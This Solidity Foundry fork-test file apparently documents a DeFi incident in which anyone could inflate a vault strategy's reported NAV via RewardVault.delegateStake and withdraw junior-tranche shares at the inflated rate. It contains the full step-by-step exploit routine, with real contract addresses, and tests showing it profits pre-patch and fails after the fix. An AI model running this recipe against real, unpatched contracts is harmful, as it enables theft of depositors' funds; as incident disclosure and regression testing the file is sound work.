// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {
    IERC20,
    IGauge,
    IStrategy,
    IIsland,
    IIslandRouter,
    ISwapRouter,
    IVault,
    Addrs
} from "../src/Interfaces.sol";

/// @title BeraFarm ZH4-06 — RewardVault delegate-stake NAV inflation (Oct-9 2026 incident)
/// @notice Fork-only PoC. No mainnet transactions. Read the incident in ../README.md.
///
/// Root cause (pre-patch strategies 0x36bfa55a / 0x64812160):
///   getTokenBalance() == RewardVault.balanceOf(strategy) and RewardVault.balanceOf
///   includes LP that ANYONE can stake *on the strategy's behalf* through
///   RewardVault.delegateStake(strategy, amount). The delegator keeps the right to pull
///   the stake back with delegateWithdraw(strategy, amount). An attacker can therefore
///   temporarily inflate the strategy's reported NAV, have TrancheVault._updateInvestment
///   book the difference as profit into the junior tranche, then withdraw junior shares at
///   the inflated rate. The patched impls (0xc6865dc8 Kodiak, 0xee965e0a Bend) subtract
///   getTotalDelegateStaked(strategy) from balanceOf, so the same call is NAV-neutral.
///
/// Two fork tests:
///   1. pre-patch build (block 27,270,000): full recipe is profitable (+77.5k HONEY)
///   2. current build (block 27,633,715): full recipe loses money; Bend siblings also patched
contract VaultNavInflationTest is Test {
    address internal constant HONEY = Addrs.HONEY;
    address internal constant USDE = Addrs.USDE;
    address internal constant ISLAND = Addrs.ISLAND;
    address internal constant ISLAND_ROUTER = Addrs.ISLAND_ROUTER;
    address internal constant SWAP_ROUTER = Addrs.SWAP_ROUTER;
    address internal constant GAUGE = Addrs.GAUGE;
    address internal constant STRATEGY = Addrs.STRATEGY;
    address internal constant VAULT = Addrs.VAULT;

    uint256 internal constant OLD_BLOCK = 27_270_000; // 0x36bfa55a (Kodiak) / 0x64812160 (Bend); island unpaused
    uint256 internal constant NEW_BLOCK = 27_633_715; // 0xc6865dc8 / 0xee965e0a live

    uint256 internal constant LP_HONEY = 220_000e18; // HONEY spent to mint ~1.2m island LP
    uint256 internal constant JR_DEPOSIT = 15_000e18; // junior deposit (limit 25k, ~16.5k free)

    string internal rpc;

    function setUp() public {
        rpc = vm.envOr("BERA_RPC_URL", string("https://berachain.drpc.org"));
    }

    // ---------------------------------------------------------------------
    // helpers
    // ---------------------------------------------------------------------
    function _fork(uint256 blockNo) internal {
        vm.createSelectFork(rpc, blockNo);
    }

    function _value() internal view returns (uint256) {
        // USDe/HONEY island pool trades ~1:1; value 1 USDe == 1 HONEY for P&L purposes.
        return IERC20(HONEY).balanceOf(address(this)) + IERC20(USDE).balanceOf(address(this));
    }

    function _mintLP(uint256 honeyIn) internal returns (uint256 lp) {
        uint256 half = honeyIn / 2;
        IERC20(HONEY).approve(SWAP_ROUTER, type(uint256).max);
        ISwapRouter(SWAP_ROUTER).exactInputSingle(
            ISwapRouter.ExactInputSingleParams({
                tokenIn: HONEY,
                tokenOut: USDE,
                fee: 500,
                recipient: address(this),
                amountIn: half,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );

        uint256 usdeBal = IERC20(USDE).balanceOf(address(this));
        uint256 honeyBal = half; // keep the other half as HONEY
        IERC20(USDE).approve(ISLAND_ROUTER, type(uint256).max);
        IERC20(HONEY).approve(ISLAND_ROUTER, type(uint256).max);
        (uint256 a0, uint256 a1, uint256 mintAmt) = IIsland(ISLAND).getMintAmounts(usdeBal, honeyBal);
        IIslandRouter(ISLAND_ROUTER).addLiquidity(ISLAND, a0, a1, 0, 0, 0, address(this));
        require(IIsland(ISLAND).balanceOf(address(this)) > 0, "no LP minted");
        lp = IIsland(ISLAND).balanceOf(address(this));
        require(lp >= mintAmt, "lp<mintAmt");
    }

    function _burnAllLP() internal {
        uint256 lp = IIsland(ISLAND).balanceOf(address(this));
        if (lp > 0) {
            IIsland(ISLAND).burn(lp, address(this));
        }
        uint256 usdeBal = IERC20(USDE).balanceOf(address(this));
        if (usdeBal > 0) {
            IERC20(USDE).approve(SWAP_ROUTER, type(uint256).max);
            ISwapRouter(SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: USDE,
                    tokenOut: HONEY,
                    fee: 500,
                    recipient: address(this),
                    amountIn: usdeBal,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );
        }
    }

    /// @dev Full Oct-9 recipe. Returns the NAV before/after delegateStake and the cash P&L.
    function _attack() internal returns (uint256 navBefore, uint256 navAfter, int256 pnl) {
        uint256 start = _value();

        // 1. obtain island LP (the leg Kodiak paused on Oct 9)
        _mintLP(LP_HONEY);
        uint256 lp = IIsland(ISLAND).balanceOf(address(this));

        // 2. junior position before the NAV is inflated
        IERC20(HONEY).approve(VAULT, type(uint256).max);
        IVault(VAULT).deposit(1, JR_DEPOSIT);

        // 3. permissionless stake on the strategy's behalf (withdrawable by us)
        navBefore = IStrategy(STRATEGY).getUnderlyingBalance();
        IERC20(ISLAND).approve(GAUGE, type(uint256).max);
        IGauge(GAUGE).delegateStake(STRATEGY, lp);
        navAfter = IStrategy(STRATEGY).getUnderlyingBalance();

        // 4. exit at the (possibly inflated) junior rate. withdraw() itself calls
        //    _updateInvestment() first, which books the NAV delta as junior profit.
        //    (A deposit cannot sync: post-delegation NAV exceeds the 325k vault TVL
        //     limit and VaultMaxTvlLimit reverts.)
        address junior = IVault(VAULT).juniorToken();
        uint256 jb = IERC20(junior).balanceOf(address(this));
        IERC20(junior).approve(VAULT, type(uint256).max);
        IVault(VAULT).withdraw(1, jb);

        // 5. recover the delegated LP and burn it
        IGauge(GAUGE).delegateWithdraw(STRATEGY, lp);
        _burnAllLP();

        pnl = int256(_value()) - int256(start);
    }

    // ---------------------------------------------------------------------
    // 1. pre-patch build: the Oct-9 recipe is profitable
    // ---------------------------------------------------------------------
    function test_old_impl_full_attack_profitable() public {
        _fork(OLD_BLOCK);
        deal(HONEY, address(this), 1_000_000e18);
        (uint256 navBefore, uint256 navAfter, int256 pnl) = _attack();
        emit log_named_uint("old NAV before", navBefore);
        emit log_named_uint("old NAV after ", navAfter);
        emit log_named_int("old P&L (HONEY wei)", pnl);
        assertGt(navAfter, navBefore, "old impl must count delegated stake as NAV");
        assertGt(pnl, 10_000e18, "pre-patch attack must extract >10k HONEY");
    }

    // ---------------------------------------------------------------------
    // 2. current build: the same recipe is unprofitable; Bend siblings patched
    // ---------------------------------------------------------------------
    function test_current_impl_full_attack_not_profitable() public {
        _fork(NEW_BLOCK);
        deal(HONEY, address(this), 1_000_000e18);
        (uint256 navBefore, uint256 navAfter, int256 pnl) = _attack();
        emit log_named_uint("new NAV before", navBefore);
        emit log_named_uint("new NAV after ", navAfter);
        emit log_named_int("new P&L (HONEY wei)", pnl);
        assertEq(navAfter, navBefore, "current impl must subtract delegated stake");
        assertLe(pnl, 0, "current build must not pay the attacker");

        // Sibling coverage: HubBend-1 / HubBend-2 use impl 0xee965e0a and the same
        // RewardVault primitive. Simulate delegateStake (+X to balance and delegate total):
        // NAV must not move.
        address[2] memory strs = [
            0xC8f67DD8C2909750705E0533f8CA71dCdf380CC9,
            0xa13e0a5fE378E89cC72730F8Df2e140Ebc6F1E84
        ];
        address[2] memory gauges = [
            0xDb6e93Cd7BddC45EbC411619792fc5f977316c38,
            0xA2CBAac782bDeCC103b2d2F746b6330525025098
        ];
        for (uint256 i = 0; i < 2; i++) {
            uint256 before = IStrategy(strs[i]).getUnderlyingBalance();
            bytes32 balSlot = keccak256(abi.encode(strs[i], uint256(9)));
            bytes32 delSlot = keccak256(abi.encode(strs[i], uint256(62)));
            uint256 bal = IGauge(gauges[i]).balanceOf(strs[i]);
            vm.store(gauges[i], balSlot, bytes32(bal + 1_000e18));
            vm.store(gauges[i], delSlot, bytes32(uint256(1_000e18)));
            uint256 afterNav = IStrategy(strs[i]).getUnderlyingBalance();
            assertEq(afterNav, before, "sibling strategy must subtract delegated stake");
        }
    }
}
